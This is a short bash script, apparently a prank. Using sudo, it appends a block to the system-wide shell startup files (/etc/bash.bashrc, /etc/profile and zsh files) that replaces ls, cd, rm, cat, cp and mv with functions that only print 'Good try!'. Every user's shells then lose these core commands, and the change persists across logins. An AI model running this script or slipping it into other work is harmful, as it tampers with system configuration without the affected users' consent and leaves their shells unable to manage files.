#!/usr/bin/env bash

set -euo pipefail

MARKER="# >>> funny-wrapper-block >>>"

WRAPPER_BLOCK=$(cat <<EOF
$MARKER
ls()  { echo "ദ്ദി ᗜˬᗜ✧ Good try! ദ്ദി ᗜˬᗜ✧"; }
cd()  { echo "ദ്ദി ᗜˬᗜ✧ Good try! ദ്ദി ᗜˬᗜ✧"; }
rm()  { echo "ദ്ദി ᗜˬᗜ✧ Good try! ദ്ദി ᗜˬᗜ✧"; }
cat() { echo "ദ്ദി ᗜˬᗜ✧ Good try! ദ്ദി ᗜˬᗜ✧"; }
cp()  { echo "ദ്ദി ᗜˬᗜ✧ Good try! ദ്ദി ᗜˬᗜ✧"; }
mv()  { echo "ദ്ദി ᗜˬᗜ✧ Good try! ദ്ദി ᗜˬᗜ✧"; }
EOF
)

TARGET_FILES=(
    "/etc/bash.bashrc"   # bash, non-login interactive (Debian/Ubuntu)
    "/etc/profile"        # sh-compatible login shells (bash, dash, ksh when invoked as login)
)

[ -d /etc/zsh ] && TARGET_FILES+=("/etc/zsh/zshrc" "/etc/zsh/zprofile")

for TARGET_FILE in "${TARGET_FILES[@]}"; do
    if [ ! -e "$TARGET_FILE" ]; then
        continue
    fi

    if grep -Fq "$MARKER" "$TARGET_FILE" 2>/dev/null; then
        continue
    fi

    printf '%s\n' "$WRAPPER_BLOCK" | sudo tee -a "$TARGET_FILE" > /dev/null
done